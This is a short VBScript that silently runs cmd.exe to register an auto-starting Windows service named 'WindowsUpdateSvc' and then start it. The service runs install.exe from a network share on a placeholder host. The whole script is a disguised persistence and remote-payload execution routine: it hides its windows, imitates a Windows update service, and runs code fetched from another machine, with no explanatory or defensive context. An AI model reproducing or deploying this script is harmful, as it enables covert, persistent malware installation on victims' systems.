Set oShell = CreateObject("WScript.Shell")
oShell.run "cmd.exe /c sc create WindowsUpdateSvc binpath= \\TARGET_IP\update\install.exe start= auto",0,True
oShell.run "cmd.exe /c sc start WindowsUpdateSvc",0,True
